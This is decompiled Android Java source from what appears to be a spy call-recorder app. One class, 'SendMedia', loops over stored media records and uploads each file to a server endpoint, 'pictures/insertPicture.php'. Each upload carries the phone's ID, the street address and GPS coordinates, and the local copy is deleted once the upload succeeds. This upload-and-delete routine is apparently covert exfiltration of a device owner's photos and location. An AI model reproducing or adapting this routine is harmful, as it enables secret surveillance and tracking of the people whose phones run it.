package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.E;
import a.c.b.a0;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.retrofit.a;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.util.HashMap;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: SendMedia */
public class l implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f283b;

    /* renamed from: a reason: collision with root package name */
    private final Context f284a;

    public l(Context context) {
        this.f284a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f284a.stopService(new Intent(this.f284a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public void run() {
        String str = "";
        try {
            if (f283b) {
                a();
                return;
            }
            f283b = true;
            a0 a0Var = new a0(this.f284a);
            a0Var.b();
            Cursor c2 = a0Var.c();
            if (c2 != null) {
                while (c2.moveToNext()) {
                    E e2 = new E();
                    e2.a(c2.getInt(0));
                    e2.f(c2.getString(1));
                    e2.g(c2.getString(2));
                    e2.h(c2.getString(3));
                    e2.c(c2.getString(4));
                    e2.b(c2.getString(5));
                    e2.e(c2.getString(6));
                    e2.d(c2.getString(7));
                    e2.a(c2.getString(8));
                    File file = new File(e2.h());
                    if (!file.exists()) {
                        a0Var.a(e2.d());
                    } else {
                        HashMap hashMap = new HashMap();
                        StringBuilder sb = new StringBuilder();
                        sb.append(str);
                        sb.append(e.e(this.f284a));
                        hashMap.put("idPhone", a.a(sb.toString()));
                        hashMap.put("name", a.a(e2.g()));
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append(e.e(this.f284a));
                        sb2.append("/");
                        sb2.append(file.getName());
                        hashMap.put("pathFile", a.a(sb2.toString()));
                        hashMap.put("size", a.a(e2.i()));
                        hashMap.put("date", a.a(e2.c()));
                        hashMap.put("address", a.a(e2.b()));
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(str);
                        sb3.append(e2.f());
                        hashMap.put("longitude", a.a(sb3.toString()));
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append(str);
                        sb4.append(e2.e());
                        hashMap.put("latitude", a.a(sb4.toString()));
                        StringBuilder sb5 = new StringBuilder();
                        sb5.append(str);
                        sb5.append(e2.a());
                        hashMap.put("accuracy", a.a(sb5.toString()));
                        if (a.c.e.a.a("pictures/insertPicture.php", hashMap, Part.createFormData("uploadedfile", file.getName(), RequestBody.create(MediaType.parse(ShareTarget.ENCODING_TYPE_MULTIPART), file))) && a0Var.a(e2.d())) {
                            file.delete();
                        }
                    }
                }
            }
            a0Var.a();
            if (c2 != null) {
                c2.close();
            }
            f283b = false;
            a();
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
    }
}
